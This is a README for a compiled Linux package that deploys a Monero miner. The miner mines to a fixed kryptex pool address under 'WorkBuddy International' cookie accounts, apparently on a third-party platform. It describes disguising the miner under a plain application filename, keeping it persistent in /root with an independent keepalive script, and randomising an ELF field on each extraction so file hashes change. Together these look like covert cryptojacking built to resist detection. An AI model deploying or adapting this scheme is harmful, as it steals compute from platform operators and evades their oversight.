International Linux x86_64 runtime — 2.3.3-ai-root

Keep start, key, data and 1.key together. Start with the existing authorized
console workflow. Runtime Cookie credentials and the package password are
supplied privately; none are embedded in this delivery.

This edition is for WorkBuddy International (.ai) Cookie accounts. It mines directly over TLS to
xmr-sg.kryptex.network:8029, using the previously configured payout account.
It does not connect to the aggregation proxy. The root repository delivery is
unchanged for existing users and Chinese deployments.

The final executable datadebug is mining-only. It has no WorkBuddy account client,
native keepalive, credential reader or guard handover code. It never stops the
initial guard. The signed manifest declares mining_only; the launcher validates
the international deployment context but sends no Cookie to the final process.
Zero arguments starts mining. --self-check checks the entry without mining or
network operations. The initial script owns keepalive independently, including
when mining or the launcher exits. This does not guarantee platform retention.
Explicit STOP, identity and permission checks remain in force.

The launcher verifies the publisher signature and complete template SHA256
before extracting the final executable. Its default name is datadebug; the
deployment script's program_name variable is passed as start --program-name.
This changes only the private runtime basename, not the signed module identity.
The root-layout installer puts start, key and 1.key directly in /root. Its signed
package is /root/international.data, preserving an unrelated /root/data. It uses
start --extract-only --output-dir /root to leave a persistent executable at
/root/<program_name>, then starts that absolute path with zero arguments.
The executable remains after it exits and can be launched directly. It needs
no package files, account credentials, launcher arguments or keepalive client
to start again. Existing executables and conflicting delivery files are retained.
Use a plain application filename. Interpreter basenames are permitted inside
the private runtime directory; system interpreters are never replaced. Paths,
module/asset collisions, and reserved service names remain rejected.
Every extraction replaces only
the 54-character field in the non-executable ELF section .agent_instance with
27 cryptographically random bytes encoded as hexadecimal (216 bits).
The surrounding record is ASRUN_INSTANCE_V1:<54 characters>:END_ASRUN_INSTANCE.
datadebug --instance-id prints that field without starting mining or network calls.
There is no identifier registry, per-instance checksum mapping or inventory.
Local randomness makes collisions extremely unlikely; global uniqueness is
not guaranteed. MD5 changes are an incidental effect, not an integrity check.
Do not erase or modify any executable code. For template integrity comparison,
restore only this validated record's 54 hexadecimal characters to ASCII zeros,
then compare the entire file's SHA256 with run_template_sha256 in release.json.

This repository publishes compiled delivery only. No console source, account
credentials, package password or signing seed is included.
